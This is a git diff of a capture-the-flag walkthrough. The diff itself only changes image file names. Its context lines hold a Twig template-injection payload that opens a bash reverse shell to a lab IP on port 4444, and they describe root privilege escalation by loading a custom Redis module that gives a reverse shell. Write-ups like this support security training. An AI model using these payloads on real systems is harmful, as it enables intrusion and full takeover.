@@ -64,7 +64,7 @@ This confirms that SSTI works and we have RCE on the machine. Sending this paylo
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/192.168.45.208/4444 0>&1'")}}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (12).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -127,10 +127,10 @@ Since `root` is running it and we can login, this means that we can also load an
 
 Compile and upload the `.so` file to the machine. Then, load it within `redis-cli`:
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (12).png" alt=""><figcaption></figcaption></figure>
 
 We can get a reverse shell via `system.rev <IP> <PORT>`:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (13).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
